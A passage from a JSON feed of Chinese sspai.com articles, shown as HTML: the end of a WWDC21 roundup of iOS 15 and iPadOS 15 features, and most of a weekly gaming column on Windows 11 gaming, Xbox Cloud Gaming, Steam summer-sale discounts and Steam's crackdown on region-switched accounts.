src=\"https://cdn.sspai.com/2021/06/09/9f8f6654ebc1999a8689ae80d285014e.gif\"></figure><h3>照片</h3>\n<p>在照片应用中，回忆功能提供了更多自定义选项，目前应用内提供了 12 种不同效果的滤镜可供选择，还集成了 Apple Music，用户可以选择热门的建议歌曲、或者通过搜索，将喜欢的歌曲作为回忆的背景音乐，让回忆具有更加符合自己喜好的风格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/daddf1858b7b28d5a0f13b9e6bf94c67.gif\"></figure><h3>其它值得关注的 iOS 15 新功能</h3>\n<ul>\n<li>钱包 App 将支持身份证、工牌、门卡类型的卡券，Aqara 将作为国内首批支持厂商。</li>\n<li>健康 App 新增步行稳定性分析、趋势数据，支持与家人共享健康数据。</li>\n<li>系统隐私设置选项中增加「记录 App 活动」，这里会记录 7 天内所有 App 访问过的数据以及访问频次。</li>\n<li>辅助功能支持为单个 App 单独设置文本粗体样式、字号等。</li>\n<li>新增查找、Game Center、App Store、睡眠模式等系统功能小组件。</li>\n<li>设备关闭或被抹掉全部内容之后，也能通过查找 App 寻找位置。</li>\n<li>地图 App 应用中，城市道路、建筑细节变得更丰富，驾驶时的导航数据也变得更加精准，支持了 AR 步行导航和公共交通整合的功能等。</li>\n</ul>\n<h2>iPadOS 15</h2>\n<p>除了和 iOS 15 一样带来了新的专注模式、通知管理、实况文本、聚焦搜索等新功能，今年的 iPadOS 15 更新依然围绕着「专为 iPad 设计」这一主题，进一步将 iPad 的使用场景和定位与 iPhone 进行了区分。</p>\n<h3>多任务处理</h3>\n<p>iPadOS 15 重新设计了多任务处理有关的大部分功能。首先是分屏入口变得更容易找到，所以正在显示的 App 顶部都有一个「…」的菜单，点击以后就可以看到 iPad 上的分屏入口了，更方便用户用户找到分屏的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/08862d76842e7c05b2373bbc519638e3\"><figcaption>入口变得更易使用</figcaption></figure><p>iPadOS 15 还优化了分屏以后选择 App 的方式。在 iPadOS 14 中，我们想要打开另一个软件的分屏，只能在 Dock 栏中选择，选择范围非常小，只有常驻的应用和最近打开的 3 个非常驻应用。在 iPadOS 15 通过顶部菜单选择分屏模式以后，当前显示的 App 会暂时挪动到一侧并显示主界面，方便用户可以从主界面和 App 资源库中自由选取应用，大大减少了过去繁复的步骤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/6f6e378259270e4a20d835c2ae44180a\"><figcaption>不止可以在 Dock 还可以在桌面和 App 资源库中选择</figcaption></figure><p>当然如果你已经习惯了以前拖拽新建分屏的操作，iPadOS 15 中你依然可以那么做，而且现在变得更加方便。在 iPadOS 15 的 App 切换界面，你可以直接把一个应用程序拖拽到已经打开的窗口上，新的分屏视图就会自动创建了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/109ae02fb7c3e263b86596c28a0531a2.gif\"><figcaption>直接拖拽就可以创建</figcaption></figure><p>对于同一个 App 打开了多个窗口的情况，iPadOS 15 也做了针对性的优化——「App 架」，通过 App 架用户可以查看一个应用程序的所有的窗口。无论是打开 App 时、还是使用分屏菜单、使用拖拽的分屏操作或是和以前一样使用「显示所有窗口」按钮，只要是这个应用已经打开了不止一个窗口，App 架就会出现来让用户选择最正确的窗口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/f8b6c75c23e5c6573e514d08d9b33d13.gif\"><figcaption>App 架会在必要时出现</figcaption></figure><p>iPadOS 15 的多任务视图目前还针对系统内的邮件、笔记和消息对话提供了一个新的分屏方式「在屏幕中央打开」，通过这种分屏方式可以快速浏览、添加或是回复内容，而不用像以前一样切换到其他窗口。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/47f9a85a07c649d71a0e05601b338014.gif\"><figcaption>新的分屏方式</figcaption></figure><h3>小组件、App 资源库</h3>\n<p>经过了一年的等待，App 资源库终于来到了 iPadOS 15，它位于 Dock 的最右侧，无论是在桌面还是在应用内都可快速调用 App 资源库。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/dba9a7e761758dd531be9f9d34770148\"><figcaption>位于 Dock 最右的 App 资源库</figcaption></figure><p>同时小组件也能和 iOS 14 一样摆放在桌面上了，用户可以通过小组件的摆放获得非常个性化的信息浏览体验。而针对 iPad 拥有更大的显示屏，iPad 上小组件也新增了更大的尺寸，这样可以展示的信息也会比原来更多。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/5c7795743aeb23a187a1cfca944f808b\"><figcaption>超大尺寸的日历能够展示更多的信息</figcaption></figure><p>新的智能堆叠组件也变得更智能了，它不仅会根据用户过去的活动适时地选择堆叠中的组件；它还会预测即将到来的事件，把那些不在堆叠里的小工具，暂时性置顶在堆叠中，并在完成后自动消失。让用户一目了然地获得更多的信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/0268015b7c665d368bf5439bc8d1407e\"><figcaption>日历原本并不在堆叠中</figcaption></figure><h3>备忘录</h3>\n<p>备忘录应用在 iPadOS 15 上也得到了质的提升。首先是快速笔记功能，原本想要在 iPadOS 上新建一个笔记只有两种办法，一是通过控制中心预先放置的按钮新建，二是通过 Apple Pencil 在锁屏界面点击一下新建。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/e943f55dad7efd0a4362d7ed5ea8485c.gif\"><figcaption>从角落唤出快速笔记</figcaption></figure><p>而 iPadOS 15 对快速笔记做了次逻辑上的升级，像是便签纸一样，用户可以在<strong>任何界面</strong>用 Apple Pencil 把它从右下角「拽」出来。这张「便签纸」还可以任意放大缩小并改变所在的位置，或是临时将它隐藏起来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/3db0107d871a08766320fcb06f9f61e9.gif\"><figcaption>可放大可缩小可隐藏</figcaption></figure><p>除了能在这张「纸」上写写画画，用户还可以把网页或者应用程序的链接放到便签纸上，当用户下次再次打开这个网页和应用程序时，快速笔记的缩略图会重新出现在角落里，提醒用户曾经做过与之相关的笔记。甚至在「亲儿子」Safari 里，用户还可以把文本和图像突出标记以后，直接放入到快速笔记里，用于持续跟踪访问过的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/161bbfa601c6c8de53b8d558a9bc61a9\"><figcaption>及时回顾网页内容</figcaption></figure><p>除了快速笔记功能，备忘录本身也得到了不小的加强。在共享笔记方面，用户可以通过活动列表查看笔记所有的更新摘要和每个合作者修改的轨迹；还可以在笔记任何的地方向右滑动，查看谁对这边做了哪些修改、修改的日期和时间，且还会使用相同的颜色把该合作者所有修改的地方使用高亮标记出来，更细致的查阅所有修改。和 iOS 15 一样还可以使用 <code>@</code> 来提醒写作者。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/4a635a0658ddb158a7e3d3902cf35dab\"><figcaption>查看活动记录</figcaption></figure><p>在个人使用方面，和 iOS 15 一样加入了标签的支持，用户可以利用标签进一步组织所有的笔记了；还可以创建基于标签的智能文件夹，用户可以打破原有基于文件夹的组织结构，用另外一个视角整理和使用笔记。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/11/article/a154d8afe5c15bea69fd587bc3321421\"><figcaption>笔记应用里的智能文件夹</figcaption></figure><h3>Safari</h3>\n<p>新的 Safari 不仅和 Mac 一样把标签栏和地址栏合二为一，还重新设计了一个新的侧边栏，用户可以在侧边栏中管理标签页、标签组、书签、阅读列表以及所有与你分享等内容，方便用户使用这些功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/9aaa6419c9f8fe57eff7059b631ea73a\"><figcaption>iPad Safari 有了新的侧边栏</figcaption></figure><p>标签组也是 iPadOS 15 里的新功能，用户可以按照类型、实际用途分门别类地保存、组织和管理不同的标签，标签组也支持在 Mac 和 iPhone 上同步，让用户继续完成浏览。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/60c6d84d2d2b9c96a06c22a904322c1c\"><figcaption>标签组功能</figcaption></figure><p>Safari 目前也支持使用网页拓展了，不过大部分都是去广告插件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/d6c59505d01aeee632a237b271ba50ba\"><figcaption>目前大部分还是去广告的插件</figcaption></figure><p>上述大部分功能也在 iOS 15 中进行了更新，iPhone 上的 Safari 浏览器也增加了更多手势操作，比如在地址栏处单指左右滑动，即可快速切换前后标签页面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/09/40af154a7e66fbbf83ce5985b47fbf3d.gif\"><figcaption>iOS 15 中 Safari 滑动地址栏就可以快速切换标签页</figcaption></figure><h3>翻译</h3>\n<p>iPad 上的翻译应用同样姗姗来迟，但也带来了很多新特性。首先，用户只要是能在 iPad 上选中的内容可以点击「翻译」来进行翻译；而那些不能选中的文字还可以使用实况文本，将它转换成可以选中的内容进行翻译；甚至是用户手写的内容也可以被选中翻译。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/5e474782c16ece5200a24dae96278757\"><figcaption>系统级翻译</figcaption></figure><p>iPad 翻译还针对实时翻译场景做了优化，它会自动检测什么时候开始说话以及什么停止说话，进而做到实时翻译的效果；此外，用户还可以调整翻译视图，无论是面对面聊天还是在同侧，总有一种视图适合当下的场景。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/article/493200458e6425a82a6c56c49ccbbffe\"><figcaption>无论是并排还是面对面都可以充分利用 iPad 大尺寸的屏幕</figcaption></figure><p>翻译 App 还支持完全离线使用，收藏常用短语和调用内置词典等功能。</p>\n<h3>其它值得关注的 iPadOS 15 新功能</h3>\n<ul>\n<li>使用通用控制可以在 Mac 和 iPad 之间使用同一个鼠标、触摸板和键盘，还可以在 iPad 和 Mac 之间拖放内容；</li>\n<li>iPad 外置键盘快捷栏经过了重新设计，快捷键提示也重新设计，还可以设置更多的键盘快捷方式；</li>\n<li>提醒事项支持自然语义识别、标签和自定义智能列表；</li>\n<li>文件支持读取 NTFS 格式的硬盘，此外复制和移动大量文件时提供进度条；</li>\n<li>未来通过 Swift Playgrounds 可以直接在 iPad 上为 iPhone 和 iPad 开发 app 并提交至 App Store。</li>\n</ul>\n<p>你还发现了哪些 iOS / iPadOS 15 中值得关注的新功能，欢迎在评论区告诉我们。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，阅读更多 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\">WWDC21 专题报道</a> 👨🏻‍💻</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67520"},{"title":"瞎玩菌的游戏周报：Xbox 云游戏、Steam 夏促等","date":"2021-07-02 07:30:26","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.7.2 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>资讯</h2>\n<h3>Windows 11 公布：史上最适合游戏的 Windows</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/69ca6e3c21fc09f659fc49226f1e187d.png\"><figcaption>注：他们真的 <a href=\"https://www.theverge.com/2015/5/7/8568473/windows-10-last-version-of-windows\">这么说过</a></figcaption></figure><p><a href=\"https://blogs.windows.com/windowsexperience/2021/06/24/introducing-windows-11/\">微软</a> 在 6 月 24 日 官宣了 Windows 11。官方宣称这一代操作系统的设计宗旨是「让你更靠近你的所爱」（bring you closer to what you love）。</p>\n<p>在 Windows 11 的官方预告视频（<a href=\"https://www.youtube.com/watch?v=Uh9643c2P6k\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1gb4y1C7Dk\">哔哩哔哩</a>）中，可以看到 Windows 改变了原来的徽标设计，新的田字形窗口变得更加扁平。</p> <p>有不少网友们认为新的 Windows 系统更加趋向于 macOS 的设计风格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/f6f65f07b9fb9293c122f7cd3b8d0f9b.png\"></figure><p>瞎玩菌第一眼看到变化最大的是任务栏，有点像 macOS 的 Dock（两者都是居中的）。其次，Windows 万年不变的字体渲染依然很糟糕，这一点真的可以向 macOS 学习。各位读者对 Windows 11 的第一印象如何？</p>\n<p>由于篇幅限制，对 Windows 11 的系统变化不多介绍，更多信息请阅读少数派的另外两篇文章：</p>\n<ul>\n<li>《<a href=\"https://sspai.com/post/67413\">Windows 11 要更新了，这些变化能让你心动吗？</a>》</li>\n<li>《<a href=\"https://sspai.com/post/67498\">升级 Windows 11 碰壁了？送你一份尝鲜指南</a>》</li>\n</ul>\n<p>在这期游戏周报中，瞎玩菌重点说说 <a href=\"https://news.xbox.com/en-us/2021/06/24/windows-11-the-best-windows-ever-for-gaming/\">Windows 11</a> 与游戏玩家相关的信息。</p>\n<p>游戏一直以来都是 Windows 的根本所在（这是微软的原话：Gaming has always been fundamental to Windows）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/f56f00d234ddaf922f5f426645e940a5.png\"></figure><p>首先 Windows 11 可以让没有 Xbox Series X|S 的玩家也能体验到 Xbox Series X|S 独占的两项技术：</p>\n<ul>\n<li>DirectStorage 提高读写性能，减少加载等待时间。</li>\n<li>Auto HDR 提升画面的明暗动态范围，带来更好的画质。</li>\n</ul>\n<p>另外 Windows 11 支持 DirectX 12 Ultimate，可以在高帧率下实现令人叹为观止、身临其境的图形。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/c9e7544d0046143d30a5e0d9112f40d1.jpg\"></figure><p>随着 Xbox 应用程序现在内置于 Windows 11，访问 Xbox Game Pass 比以往更容易（在 Windows 10 中需要单独下载安装）。上图是 XGP 游戏库中，玩家在今年内就可以玩到的 PC 游戏，这些游戏全部是首发日即登录 XGP。图中的《十二分钟》采用了新公布的游戏海报。今年还有玩家们期待已久的《光环 无限》《帝国时代 4》《极限竞速 地平线 5》等。</p>\n<h3>微软对非游戏内购抽成从 15% 降至 0%，游戏维持 12% 不变</h3>\n<p>作为 Windows 11 公布的一部分，微软还宣布，从 7 月 28 日开始，如果开发者在他们的应用程序中使用自己的或第三方的支付系统（即不使用微软商店的内购 API），微软将让他们保留 100% 的收入。但该协议有一个重要的注意事项：它并不适用于游戏。</p>\n<p>这一信息公布之后，为抽成问题与苹果打官司的 Epic Games CEO Tim Sweeney 都发推称赞：</p>\n<blockquote><p>2021 版的微软是史上最好的微软版本！</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/a9605c731ce12c1245858a64e0fa99f3.png\"><figcaption>图源 <a href=\"https://twitter.com/TimSweeneyEpic/status/1408094368918032386\">Twitter Tim Sweeney</a></figcaption></figure><p>根据之前 Epic 与苹果庭审过程中的爆料，微软一直在亏本销售 Xbox 硬件，因此不难理解为什么微软要坚持对游戏的收入保持 12% 的抽成。</p>\n<h3>Xbox 云游戏开放浏览器游玩，「曲线救国」支持苹果设备和 PC</h3>\n<p>6 月 28 日，<a href=\"https://news.xbox.com/en-us/2021/06/28/xbox-cloud-gaming-now-running-on-xbox-series-x/\">微软</a> 宣布 Xbox 云游戏（Xbox Cloud Gaming，今后瞎玩菌的文章中将采用这一官方名称）终于结束了 4 月开始的邀请制 Beta 测试（当时的名称为 xCloud，跟这里说的是同一个服务），为 22 个国家/地区的 Xbox Game Pass Ultimate 会员开放了这项服务。</p>\n<p>注意：开放的 22 个国家/地区不含中国大陆。这不是开放先后顺序的问题，而是 XGP 本来就没有在中国大陆开放。</p>\n<p>只需在你的 PC 或移动设备上通过微软 Edge、Chrome 或 Safari 浏览器访问 <a href=\"https://xbox.com/play\">xbox.com/play</a>，就可以开始玩 Xbox Game Pass 库中的数百款游戏。这一方式绕过了苹果 App Store 的审核机制。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/666ea49424887a281a6680d03ccd4cff.png\"></figure><p>为此微软发布了 Xbox 云游戏的宣传视频（<a href=\"https://www.youtube.com/watch?v=lHDrZRd7cBc\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV17U4y1V7Sn\">哔哩哔哩</a>）：</p> <p>在此前不久，Xbox 云游戏升级为定制的 Xbox Series X 服务器硬件。硬件升级后，Xbox 云游戏可以提供更快的加载时间、更好的帧率和新一代游戏的体验。为了确保在最广泛的设备上获得最低延迟、最高质量的体验，Xbox 云游戏现在支持 1080p 分辨率和最高 60fps 的速度传输。</p>\n<p>就像你已经拥有一台 Xbox Series X 主机，通过 Xbox 云游戏你一样可以接入 Xbox Live 网络与其他玩家联机，并且支持云存档——你可以在 iPhone 上玩到一半停下来，再到 iPad 上继续玩刚才的进度。</p>\n<p>Xbox 云游戏时除了可以使用定制的触摸屏操作方式，还支持使用游戏手柄。除了兼容的 Xbox 手柄，还可以在 <a href=\"https://support.xbox.com/en-US/help/games-apps/cloud-gaming/cloud-gaming-tested-controllers\">Xbox 官网</a> 查看经过测试支持 Xbox 云游戏的手柄列表，例如：国产厂商 8 位堂的部分手柄，还有 PS4 手柄和 Xbox Backbone One 这样专为手机设计的扩展式手柄。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/d8f0210d979ca6d91e241c8524e303c8.jpg\"><figcaption>Xbox Backbone One 手机手柄，图源 <a href=\"https://news.xbox.com/en-us/2021/06/28/expanding-designed-for-xbox-mobile-accessories/\">Xbox 官网</a></figcaption></figure><p>瞎玩菌个人最推荐的是 Xbox 手柄（官方名称叫 Xbox 无线控制器），它的优势很大：</p>\n<ul>\n<li>玩家们公认的手感最佳，尤其是一分钱一分货的 Xbox 精英手柄。</li>\n<li>无缝兼容 Xbox、PC 和 Apple 设备。根据 <a href=\"https://support.apple.com/zh-cn/HT210414\">Apple 支持官网</a> 的说明，Apple 设备支持的手柄只有 3 种：Xbox 手柄、PS 手柄 和 MFi 手柄。其中 MFi 手柄只有 iOS 专用，不能用于 PC 和 Xbox，因此这是最不通用的选择。而 PS 手柄手感不如 Xbox 手柄。除了 Xbox 云游戏，你还可以用 Xbox 手柄玩 Apple Arcade 游戏，或者 5 月 19 日刚刚登录 iPad 平台的《<a href=\"https://apps.apple.com/hk/app/divinity-original-sin-2/id1458655678\">神界：原罪 2</a>》终极版。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/fc0646ed75662550de7b958630cb74fe.png\"><figcaption>游戏《神界：原罪 2》 图源 <a href=\"https://www.reddit.com/r/DivinityOriginalSin/comments/fxgjg5/happy_fire_voidling_noises/\">reddit Tacska</a></figcaption></figure><ul>\n<li>使用寿命长，我用过的 Xbox 手柄还没有用坏的，至少没遇到过 Switch Joy-con 著名的手柄漂移问题。</li>\n<li>支持 5 号电池/可拆卸的充电电池两种供电方式，不必担心手柄随着电池老化而「强制报废」。后者还支持边充边玩。</li>\n</ul>\n<p>另外，少数派商店上架了来自 imPoi 的 Xbox / PlayStation 的手柄充电底座，目前售价 ￥99，其中 Xbox 款额外送两块充电电池 ，感兴趣的可以戳 <a href=\"https://sspai.com/post/67402\" target=\"_blank\">这里</a> 了解。</p>\n<h3>Steam 夏季大促新史低汇总，《只狼》半价领跑</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/62d4015962d5743f7ec7a4439719e4c7.jpg\"></figure><p>一年一度的 <a href=\"https://store.steampowered.com/?snr=1_2108_9__2107\">Steam 夏季大促</a> 如期来临，从北京时间 2021 年 6 月 25 日凌晨 1 点至 7 月 9 日凌晨 1 点，玩家们有充分的时间来选购自己喜欢的游戏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/6980a6b033de2f91d5aa4888c48942b0.jpeg\"></figure><p>这一次 Steam 开启了名为「<a href=\"https://store.steampowered.com/forgeyourfate?snr=1_2108_9__2107\">命运自己掌握</a>」的活动，有十四个主题页面，内含决定命途的微型冒险，每一个都会最终获得一张动画贴纸，而所有故事最后都会在命运掌握于手的徽章和无限荣耀中达到高潮。</p>\n<p>玩家还可以在点数商店中查看 <a href=\"https://store.steampowered.com/points/shop/c/profilebundles?snr=1_2108_9__2107\">全新游戏个人资料</a>，其中包括您最爱游戏的动画背景、迷你个人资料、头像以及配色方案。</p>\n<p>瞎玩菌为各位汇总了新史低（注：史上最低折扣，并且是第一次达到这么低）的部分游戏清单：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/06886cdf19a848dc5f392b140e165f84.jpeg\"><figcaption>《只狼》的玩法</figcaption></figure><ul>\n<li>《只狼：影逝二度》年度版 ── 134 元（原价 268 元），宫崎英高的游戏性价比极高，据说有些玩家可以玩一辈子</li>\n<li>《极限竞速：地平线 4》── 标准版 94 元（原价 188 元），豪华版 128 元（原价 256 元），终极版 149 元（原价 333 元）</li>\n<li>《古剑奇谭三》 ── 29 元（原价 99 元）</li>\n<li>《Valheim：英灵神殿》 ── 63 元（原价 70 元）</li>\n<li>《尼尔：人工生命 ver.1.22474487139...》── 269 元（原价 359 元）</li>\n<li>《海岛大亨 6》 ── 80 元（原价 160 元）</li>\n<li>《黑帝斯》 ── 56 元（原价 80 元）</li>\n<li>《糖豆人：终极淘汰赛》 ── 34元（原价58元）</li>\n<li>《雨中冒险 2》 ── 53 元（原价 83 元）</li>\n<li>《命令与征服：重制版》 ── 47 元（原价 118 元）</li>\n<li>《天外世界》 ── 79 元（原价 199 元）</li>\n<li>《冰汽时代》── 32 元（原价 99 元）</li>\n<li>《心魔》（The Beast Inside）── 16 元（原价 80 元）</li>\n<li>《逃出生天》（A Way Out）── 39 元（原价 158 元）</li>\n<li>《人中之龙 7 光与暗的去向 国际版》── 252 元（原价 389 元）</li>\n<li>《瘟疫 2》（Pathologic 2）33 元（原价 103 元）</li>\n<li>《底特律：化身为人》 ── 64 元（原价 128 元）</li>\n<li>《四海兄弟：最终版》 ── 83 元（原价 139 元）</li>\n<li>《黑森町绮谭》（Tales of the Black Forest）── 7 元（原价 18 元）</li>\n<li>《中土世界 : 战争之影》 ── 21 元（原价 143 元）</li>\n<li>《动物园之星》 ── 81 元（原价 180 元）</li>\n<li>《星际反叛军》（Star Renegades）── 48 元（原价 80 元）</li>\n<li>《战地 1》 ── 39 元（原价 198 元）</li>\n<li>《战地风云 5》 ── 57 元（原价 228 元）</li>\n<li>《星球大战绝地：陨落的武士团》 ── 79 元（原价 198 元）</li>\n<li>《追忆列车》（NOSTALGIC TRAIN）── 21 元（原价 36 元）</li>\n<li>《112 接线员》 （112 Operator）── 30 元（原价 80 元）</li>\n<li>《泰坦天降 2》 ── 31元（原价 158 元）</li>\n<li>《莱莎的炼金工房２ ～失落传说与秘密妖精～》── 261 元（原价 279 元）</li>\n<li>《最终幻想世界》 ── 66 元（原价 166 元）</li>\n<li>《Haven》── 56 元（原价 80 元）</li>\n<li>《传说之下》（Undertale） ── 10 元（原价 36 元）</li>\n<li>《火炬之光 3》（Torchlight III）── 77 元（原价 210 元）</li>\n<li>《女神异闻录 4：黄金版》 ── 81 元（原价 125 元）</li>\n<li>《开拓者：拥王者》 ── 31 元（原价 70 元）</li>\n<li>《FOCUS on YOU》── 69 元（原价 116 元）</li>\n<li>《胡闹厨房 2》 ── 44 元（原价 98 元）</li>\n<li>《大鹅模拟器》 ── 35 元（原价 70 元）</li>\n<li>《月球坠落时》（Moon Fall） ── 33 元（原价 42 元）</li>\n<li>《赛博朋克 2077》 ── 199 元（原价 298 元）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/7df3b91cf2ec07ac0301d275983667bc.png\"></figure><p>在上期游戏周报的评论中，有位读者提到了 CRPG 经典《博德之门》系列的 1 代和 2 代加强版。这两款游戏也迎来了新史低，分别为 10 元和 13 元。这两款游戏瞎玩菌玩过上百小时，而且平时很少有这么低的折扣，这么便宜买不了吃亏买不了上当，私心推荐。</p>\n<p>即使我列出这么多新史低，依然没有涵盖全面，更别说平史低和其他没有到史低程度但依旧质量很高的游戏。所以欢迎各位玩家在评论中推荐更多值得入手的游戏，或者分享你在这次夏日特卖活动中购买的游戏。</p>\n<h3>Steam 遣返大量「云阿根廷人」，Steam 转区限制从 2 周变为 3 个月</h3>\n<p>6 月 27 日，部分持有 Steam 阿根廷区账号的玩家 <a href=\"https://weibo.com/search?containerid=100103type%3D61%26q%3Dsteam%20%E9%98%BF%E6%A0%B9%E5%BB%B7%26t%3D0\">爆料</a>——他们被 Steam 强制遣返回了中国区。这些账号的共同特点是初始注册所在地是中国，但中途转过区。</p>\n<p>Steam 的低价区策略实行已久，而很多玩家心照不宣地薅起了低价区的羊毛，还有一些玩家到外区是为了购买《<a href=\"https://store.steampowered.com/app/1001630/SUBVERSE/\">Subverse</a>》这类锁中国区的游戏。</p>\n<p>给不了解的玩家科普一下，由于货币汇率等多方面原因，Steam 在阿根廷、俄罗斯等国家/地区设置了比其他地区普遍更低的定价（这不是绝对的，也有游戏定价比中国区还贵），低到了什么程度呢？以一个好懂的数字来说明，中国区一个游戏卖 100 元，在阿根廷区可能就只要 20 元（使用等价值的阿根廷比索购买），碰到夏促这种来个 -50% 不过分吧，那就只要 10 元，最后再把游戏挂卡一卖，实际上最终只花 8 元左右就能买到同一个游戏。你说游戏厂商和抽成  30% 的 Steam 是不是血亏？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/09123191ba5125ccf1c04c32794022eb.jpeg\"></figure><p>目前暂不清楚 Steam 是根据登录 IP 地址还是什么信息来让这些账号遣返，但已知很多阿根廷区和俄罗斯区的原生（指的是注册时就在对应地区）账号没有被遣返。</p>\n<p>其实受到影响最大的还不是中国玩家，据 <a href=\"https://www.gamevicio.com/noticias/2021/06/acabou-a-farra-valve-esta-retornando-usuario-do-steam-argentina-de-volta-para-o-brasil/\">外媒</a> 报道，大量巴西 Steam 玩家也遇到了从阿根廷区遣返回国的情况。 Steam 作为一个全球线上市场，显然薅羊毛不是中国玩家专有的行为，还有 <a href=\"https://www.resetera.com/threads/apparently-valve-did-a-region-rollback-for-several-countries.448783/\">其他外国玩家</a> 也表示遇到了同样的情况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/a8adf8cc9662e77189f86cf7dce905af.jpeg\"></figure><p>同时 Steam 还修改了账号转区的规定，冷却时间从之前的 2 个星期变成了 3 个月。</p>\n<p>Steam 在夏促期间动手，显然是因为这种行为损害了游戏厂商和 Steam 平台的利益。一名开发商晒出了后台销售数据：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/2f5ebb1296e847e427b8a7e7975e75d1.png\"><figcaption>图源 <a href=\"https://twitter.com/LorenLemcke/status/1406134596622823428\">Twitter LorenLemcke</a></figcaption></figure><p>它的游戏有 82% 的销量来自于定价最低的阿根廷区。这位开发商还发出善意提示：</p>\n<blockquote><p>当你因为区域性定价而搞砸 Steam 时，你也在搞砸开发者。</p></blockquote>\n<h3>Steam 销量榜大变天，「给他爱 5」下榜，微软独孤求败</h3>\n<p>截止到 6 月 27 日，Steam 夏促开始后的第一个 <a href=\"https://store.steampowered.com/feeds/weeklytopsellers.xml\">一周销量排行榜</a> 公布了。</p>\n<p>刚刚迎来大规模内容更新的《盗贼之海》占据榜首，而首次登录 Steam 的《极限竞速 地平线 4》两个版本都进入了榜单，还有《光环：士官长合集》占据了第 5 名。具体排名如下：</p>\n<ol>\n<li>《盗贼之海》</li>\n<li>《只狼 影逝二度》年度版</li>\n<li>《地平线 零之曙光》完整版</li>\n<li>《极限竞速 地平线 4》标准版</li>\n<li>《光环：士官长合集》</li>\n<li>Valve Index VR 套件</li>\n<li>《绝地求生》</li>\n<li>《腐蚀》</li>\n<li>《极限竞速 地平线 4》终极版</li>\n<li>《双人成行》</li>\n</ol>\n<p>《GTA 5》又一次掉出前 10 名。所以说 R 星你的《GTA 6》搞快点吧！</p>\n<h3>尽量一句话新闻</h3>\n<p>为控制游戏周报的篇幅，并保持足够的信息量，本期开始加入「尽量一句话新闻」的环节。大部分时候瞎玩菌尽量用一句话浓缩信息，偶尔也会不止一句话。读者可以点击链接以了解更多信息。</p>\n<ul>\n<li>索尼收购《Returnal》开发商 <a 